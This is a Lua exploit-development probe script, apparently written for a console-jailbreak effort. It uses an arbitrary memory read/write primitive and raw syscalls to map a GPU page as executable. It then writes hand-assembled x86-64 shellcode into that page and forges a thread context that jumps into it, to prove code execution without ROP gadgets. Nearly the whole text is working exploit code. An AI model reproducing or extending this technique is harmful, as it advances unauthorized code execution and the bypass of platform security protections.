-- CRASH_CLASS: HIGH
-- PROBE 940c: does a GPU mapping execute? Gadget-free design.
-- 940a/940b used eboot gadget offsets copied from an older session - with ASLR those point
-- at arbitrary code, which is what killed the process (the store gadget wrote to a bad rdi).
-- Here the child needs no gadgets at all:
--   control : ctx RAX=431 (thr_exit), RDI=0, RIP=fn  -> child exits inside the fcall stub
--   test    : RIP=GPU page whose bytes write a marker, load RAX=431, then jmp fn
-- Survival of the test child plus the marker written proves the GPU page executed.
print("=== PROBE 940c: GPU exec, no gadgets ===")
local function to_num(v)
    if type(v) == "table" and v.tonumber then local ok, n = pcall(function() return v:tonumber() end); if ok and n then return n end end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_wq(a, v) return (pcall(function() memory.write_qword(a, v) end)) end
local function safe_wb(a, v) return (pcall(function() memory.write_byte(a, v) end)) end
local function safe_rq(a) local ok, v = pcall(function() return memory.read_qword(a) end); if ok then return v end return nil end
local function fmt(v) local h, l = 0, to_num(v); if type(v) == "table" and v.h then h, l = v.h, v.l end; return string.format("0x%X%08X", h, l) end

local sc_mmap = make_syscall(477)
local sc_thr  = make_syscall(430)
local fn
do
    local s = tostring(syscall.pipe):match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
    if s then fn = tonumber(s:sub(3), 16) end
end
print("[0] fn=" .. tostring(fn and string.format("0x%X", fn) or "nil"))
if not fn then print("[0] FAIL"); return end

local function ctx_make(entry, rsp, rdi, rax)
    local ctx = memory.alloc(0x140)
    for i = 0, 0x13C, 8 do safe_wq(ctx + i, 0) end
    local stack = memory.alloc(0x100)
    for i = 0, 0xF8, 8 do safe_wq(stack + i, 0) end
    pcall(function() memory.write_dword(ctx + 0x0C0, 0x43) end)
    pcall(function() memory.write_dword(ctx + 0x100, 0x3B) end)
    safe_wq(ctx + 0x0E0, entry)
    safe_wq(ctx + 0x0F8, rsp or stack)
    safe_wq(ctx + 0x108, 0x480)
    safe_wq(ctx + 0x110, 0x10000)
    safe_wq(ctx + 0x0D0, 0)
    safe_wq(ctx + 0x048, rdi)
    safe_wq(ctx + 0x078, rax)
    return ctx
end

-- [1] control: child exits itself
local okc, rvc = pcall(function() return sc_thr(uint64(ctx_make(fn, nil, 0, 431)), uint64(0)) end)
print(string.format("[1] control thr_exit child rv=%s alive", tostring(okc and fmt(rvc) or "pcall-fail")))

-- [2] GPU mapping, prot=7
local PAGE = 0x4000
local ok, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(PAGE * 4), uint64(7), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
local base = ok and to_num(gpu) or 0
print(string.format("[2] GPU mmap -> %s", fmt(base)))
if base == 0 or base == 0xFFFFFFFFFFFFFFFF then print("[Z] DONE"); return end

local out = memory.alloc(0x10)
safe_wq(out, 0)
save = nil
-- page: mov [rax], rdi ; mov rax, 431 ; xor edi, edi ; jmp fn
local b = {}
local function emit(...) for _, x in ipairs({...}) do b[#b + 1] = x end end
emit(0x48, 0x89, 0x38)                       -- mov [rax], rdi
emit(0x48, 0xC7, 0xC0, 0xAF, 0x01, 0x00, 0x00) -- mov rax, 431
emit(0x31, 0xFF)                             -- xor edi, edi
emit(0xE9)                                   -- jmp rel32
local jmp_end = #b + 4
local rel = (fn - (base + jmp_end)) % 4294967296
emit(rel % 256, math.floor(rel / 256) % 256, math.floor(rel / 65536) % 256, math.floor(rel / 16777216) % 256)
for i, byte in ipairs(b) do safe_wb(base + i - 1, byte) end
local chk0 = safe_rq(base)
print(string.format("[3] page bytes %s (len %d)", tostring(chk0 and fmt(chk0) or "nil"), #b))

safe_wq(out, 0)
local okx, rvx = pcall(function() return sc_thr(uint64(ctx_make(base, nil, 0x1122334455667788, out)), uint64(0)) end)
local got = safe_rq(out)
print(string.format("[4] entry=GPU rv=%s marker=%s", tostring(okx and fmt(rvx) or "pcall-fail"), tostring(got and fmt(got) or "nil")))
if got and to_num(got) ~= 0 then print("[4] EXECUTED GPU PAGE") end
print("[Z] DONE")
